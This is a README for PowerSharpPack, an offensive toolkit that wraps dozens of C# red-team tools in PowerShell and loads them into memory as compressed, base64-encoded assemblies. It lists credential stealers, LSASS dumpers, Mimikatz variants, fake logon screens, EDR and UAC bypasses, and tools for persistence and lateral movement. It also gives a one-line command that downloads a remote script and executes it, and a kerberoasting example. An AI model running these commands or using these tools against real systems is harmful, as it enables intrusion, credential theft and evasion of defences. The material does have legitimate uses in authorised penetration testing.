# Sponsored by

[<img src="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/images/happy_alp.png" width="300" height="300">](https://www.bluebastion.net/) &emsp; &emsp; &emsp;

# PowerSharpPack

Many useful offensive CSharp Projects wraped into Powershell for easy usage.

Why? In my personal opinion offensive Powershell is not dead because of AMSI, Script-block-logging, Constrained Language Mode or other protection features. Any of these mechanisms can be bypassed. Since most new innovative offensive security projects are written in C# I decided to make them usable in powershell as well.

So what did i basically do here? 

1) First of all clone each C# Repo.
2) Set the class and main methods public
3) For some projects i merged pull requests with new features or bug fixes or i had to remove environment.exit statements so that the whole powershell process is not killed for missing parameters and so on
4) Afterwards compiling each binary
5) Gzip-compress and base64-Encode the compiled binary base64 and load it in powershell via `[System.Reflection.Assembly]::Load($DecompressedDecodedBinary)`.

Its a very easy but for many repos time consuming process.

Which tools are included?

 **Internalmonologue**

 Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
 
 @Credit to: https://github.com/eladshamir/Internal-Monologue

 **Seatbelt**

 Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
 
 @Credit to: https://github.com/GhostPack/Seatbelt

 **SharpWeb**

 .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge.
 
 @Credit to: https://github.com/djhohnstein/SharpWeb

 **UrbanBishop**

 Creates a local RW section in UrbanBishop and then maps that section as RX into a remote process. Shellcode loading made easy.
 
 @Credit to: https://github.com/FuzzySecurity/Sharp-Suite

 **SharpUp**

 SharpUp is a C# port of various PowerUp functionality.
 
 @Credit to: https://github.com/GhostPack/SharpUp

 **Rubeus**

 Rubeus is a C# toolset for raw Kerberos interaction and abuses.
 
 @Credit to: https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/

 **SharPersist**

 Windows persistence toolkit written in C#.
 
 @Credit to: https://github.com/fireeye/SharPersist

 **Sharpview**

 C# implementation of harmj0y's PowerView
 
 @Credit to: https://github.com/tevora-threat/SharpView

 **winPEAS**

 Check the Local Windows Privilege Escalation checklist from book.hacktricks.xyz
 
 @Credit to: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

 **Lockless**

 Lockless allows for the copying of locked files.
 
 @Credit to: https://github.com/GhostPack/Lockless

 **SharpChromium**

 .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins.
 
 @Credit to: https://github.com/djhohnstein/SharpChromium

 **SharpDPAPI**

 SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.
 
 @Credit to: https://github.com/GhostPack/SharpDPAPI && https://github.com/gentilkiwi/mimikatz/

 **SharpShares**

 Enumerate all network shares in the current domain. Also, can resolve names to IP addresses.
 
 @Credit to: https://github.com/djhohnstein/SharpShares

 **SharpSniper**

 Find specific users in active directory via their username and logon IP address
 
 @Credit to: https://github.com/HunnicCyber/SharpSniper

 **SharpSpray**

 SharpSpray a simple code set to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobalt Strike.
 
 @Credit to: https://github.com/jnqpblc/SharpSpray

 **Watson**

 Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities
 
 @Credit to: https://github.com/rasta-mouse/Watson

 **Grouper2**

 Find vulnerabilities in AD Group Policy
 
 @Credit to: https://github.com/l0ss/Grouper2

 **Tokenvator**

 A tool to elevate privilege with Windows Tokens
 
 @Credit to: https://github.com/0xbadjuju/Tokenvator

 **SauronEye**

 Search tool to find specific files containing specific words, i.e. files containing passwords.
 
 @Credit to: https://github.com/vivami/SauronEye

Just load the main script with

`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')`


and choose the tool as switch parameter for example:

`PowerSharpPack -seatbelt -Command "AMSIProviders"`

![alt text](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/images/Example.JPG)

If you want to pass multiple parameters to the binary you can just use quotation marks like:

`PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`

If you dont want to load all binaries for reasons you can use the per binary Powershell scripts located in the PowerSharpBinaries folder.

Projects which are also available as standalone powershell script:

 **SharpCloud**

 Simple C# for checking for the existence of credential files related to AWS, Microsoft Azure, and Google Compute.
 
 @Credit to: https://github.com/chrismaddalena/SharpCloud

 **SharpSSDP**

 SSDP Service Discovery
 
 @Credit to: https://github.com/rvrsh3ll/SharpSSDP

 **DAFT**

 DAFT: Database Audit Framework & Toolkit
 
 @Credit to: https://github.com/NetSPI/DAFT

 **Get-RBCD-Threaded**

 Tool to discover Resource-Based Constrained Delegation attack paths in Active Directory environments
 
 @Credit to: https://github.com/FatRodzianko/Get-RBCD-Threaded

 **SharpGPO-RemoteAccessPolicies**

 A C# tool for enumerating remote access policies through group policy.
 
 @Credit to: https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies

 **SharpAllowedToAct**

 Computer object takeover through Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity)
 
 @Credit to: https://github.com/pkb1s/SharpAllowedToAct

 **WireTap**

 .NET 4.0 Project to interact with video, audio and keyboard hardware.
 
 @Credit to: https://github.com/djhohnstein/WireTap

 **SharpClipboard**

 C# Clipboard Monitor
 
 @Credit to: https://github.com/slyd0g/SharpClipboard

 **SharpPrinter**

 Discover Printers + check for vulns
 
 @Credit to: https://github.com/rvrsh3ll/SharpPrinter

 **SharpHide**

 Tool to create hidden registry keys.
 
 @Credit to: https://github.com/outflanknl/SharpHide

 **SpoolSample**

 PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface. This is possible via other protocols as well.
 
 @Credit to: https://github.com/leechristensen/SpoolSample

 **SharpGPOAbuse**

 SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.
 
 @Credit to: https://github.com/FSecureLABS/SharpGPOAbuse

 **SharpDump**

 SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality.
 
 @Credit to: https://github.com/GhostPack/SharpDump

 **SharpHound3**

 C# Data Collector for the BloodHound Project, Version 3
 
 @Credit to: https://github.com/BloodHoundAD/SharpHound3

**PostDump**

Another tool to perform minidump of LSASS process using few technics to avoid detection.

@Credit to: https://github.com/YOLOP0wn/POSTDump

 **SharpLocker**

 SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.
 
 @Credit to: https://github.com/Pickfordmatt/SharpLocker

 **Eyewitness**

 EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.
 
 @Credit to: https://github.com/FortyNorthSecurity/EyeWitness

 **FakeLogonScreen**

 Fake Windows logon screen to steal passwords
 
 @Credit to: https://github.com/bitsadmin/fakelogonscreen

 **P0wnedShell**

 PowerShell Runspace Post Exploitation Toolkit
 
 @Credit to: https://github.com/Cn33liz/p0wnedShell
 
 **Safetykatz**
 
 SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subTee's .NET PE Loader
 I modified this one again with my own obfuscated Mimikatz Version.
 
 @Credit to: https://github.com/GhostPack/SafetyKatz

**InveighZero**

Windows C# LLMNR/mDNS/NBNS/DNS/DHCPv6 spoofer/man-in-the-middle tool .

 @Credit to: https://github.com/Kevin-Robertson/InveighZero
 
 **SharpSploit**
 
 SharpSploit is a .NET post-exploitation library written in C#.
 
 @Credit to: https://github.com/cobbr/SharpSploit


 **Snaffler**

 A tool for pentesters to help find delicious candy, by @l0ss and @Sh3r4 ( Twitter: @/mikeloss and @/sh3r4_hax ).
 
 @Credit to: https://github.com/SnaffCon/Snaffler

**BadPotato**

 itm4ns Printspoofer in C#.
 
 @Credit to: https://github.com/BeichenDream/BadPotato
 
 
 **BetterSafetyKatz**
 
Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory.

 @Credit to: https://github.com/Flangvik/BetterSafetyKatz

**SharpKatz**
 
C# Port of mimikatz sekurlsa::logonpasswords, sekurlsa::ekeys and lsadump::dcsync commands.

 @Credit to: https://github.com/b4rtik/SharpKatz

**Gopher**

C# tool to discover low hanging fruits.

@Credit to: https://github.com/EncodeGroup/Gopher

**SharpOxidResolver**

IOXIDResolver from AirBus Security/PingCastle.

@Credit to: https://github.com/vletoux/pingcastle/

**SharpBlock**

A method of bypassing EDR's active projection DLL's by preventing entry point exection.

@Credit to: https://github.com/CCob/SharpBlock

**SharpLoginPrompt**

This Program creates a login prompt to gather username and password of the current user. This project allows red team to phish username and password of the current user without touching lsass and having adminitrator credentials on the system.

@Credit to: https://github.com/shantanu561993/SharpLoginPrompt

**ThunderFox**

Retrieves data (contacts, emails, history, cookies and credentials) from Thunderbird and Firefox.

@Credit to: https://github.com/V1V1/SharpScribbles

**StickyNotesExtract**

Extracts data from the Windows Sticky Notes database. Works on Windows 10 Build 1607 and higher. This project doesn't rely on any external dependencies.

@Credit to: https://github.com/V1V1/SharpScribbles


**SCShell**

Fileless lateral movement tool that relies on ChangeServiceConfigA to run command.

@Credit to: https://github.com/Mr-Un1k0d3r/SCShell

**SharpSecDump**

.Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py.

@Credit to: https://github.com/G0ldenGunSec/SharpSecDump

**SharpHandler**

This project reuses open handles to lsass to parse or minidump lsass, therefore you don't need to use your own lsass handle to interact with it.

@Credit to: https://github.com/jfmaes/SharpHandler

**SharpRDP**

Remote Desktop Protocol .NET Console Application for Authenticated Command Execution.

@Credit to: https://github.com/0xthirteen/SharpRDP

**SharpMove**

.NET Project for performing Authenticated Remote Execution.

@Credit to: https://github.com/0xthirteen/SharpMove

**SharpStay**

.NET project for installing Persistence

@Credit to: https://github.com/0xthirteen/SharpStay


**SharpPrintNightmare**

C# implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527 

@Credit to: https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare

**Certify**

Active Directory certificate abuse. 

@Credit to: https://github.com/GhostPack/Certify

**Farmer**

Farmer is a project for collecting NetNTLM hashes in a Windows domain. Farmer achieves this by creating a local WebDAV server that causes the WebDAV Mini Redirector to authenticate from any connecting clients.

@Credit to: https://github.com/mdsecactivebreach/Farmer

**SharpBypassUAC**

C# tool for UAC bypasses 

@Credit to: https://github.com/FatRodzianko/SharpBypassUAC

**StandIn**

StandIn is a small .NET35/45 AD post-exploitation toolkit

@Credit to: https://github.com/FuzzySecurity/StandIn

**Carbuncle**

Tool for interacting with outlook interop during red team engagements 

@Credit to: https://github.com/checkymander/Carbuncle


**Whisker**

Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account. 

@Credit to: https://github.com/eladshamir/Whisker

**SharpLdapRelayScan**

C# Port of LdapRelayScan

@Credit to: https://github.com/klezVirus/SharpLdapRelayScan

**LdapSignCheck**

C# project to check LDAP signing.

@Credit to: https://github.com/cube0x0/LdapSignCheck

**SharpImpersonation**

SharpImpersonation - A User Impersonation tool - via Token or Shellcode injection.

@Credit to: https://github.com/S3cur3Th1sSh1t/SharpImpersonation

**SharpWSUS**

SharpWSUS is a CSharp tool for lateral movement through WSUS. There is a corresponding blog (https://labs.nettitude.com/blog/introducing-sharpwsus/) which has more detailed information about the tooling, use case and detection.

@Credit to: https://github.com/nettitude/SharpWSUS

**MalSCCM**

This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage. To use this tool your current process must have admin rights over the SCCM server. Typically deployments of SCCM will either have the management server and the primary server on the same host, in which case the host returned from the locate command can be used as the primary server.

@Credit to: https://github.com/nettitude/MalSCCM

**KrbRelay**

Framework for Kerberos relaying

@Credit to: https://github.com/cube0x0/KrbRelay

**SharpSCCM**

A C# utility for interacting with SCCM 

@Credit: https://github.com/Mayyhem/SharpSCCM

**ShadowSpray**

A tool to spray Shadow Credentials across an entire domain in hopes of abusing long forgotten GenericWrite/GenericAll DACLs over other objects in the domain.

@Credit: https://github.com/Dec0ne/ShadowSpray

**Grouper3**

Find vulnerabilities in AD Group Policy, but do it better than Grouper2 did.

@Credit to: https://github.com/Group3r/Group3r

#### _The last two are basically no Assemblies. But I did built an Assembly to execute them from memory, which is loadable via the technique from this repo. Another technique in the background for execution, but still usefull_:


**HandleKatz**

PIC lsass dumper using cloned handles

@Credit to: https://github.com/codewhitesec/HandleKatz


**NanoDump**

Dump LSASS like you mean it

@Credit to: https://github.com/helpsystems/nanodump


**PPLDump**

Dump the memory of a PPL with a userland exploit

@Credit to: https://github.com/itm4n/PPLdump
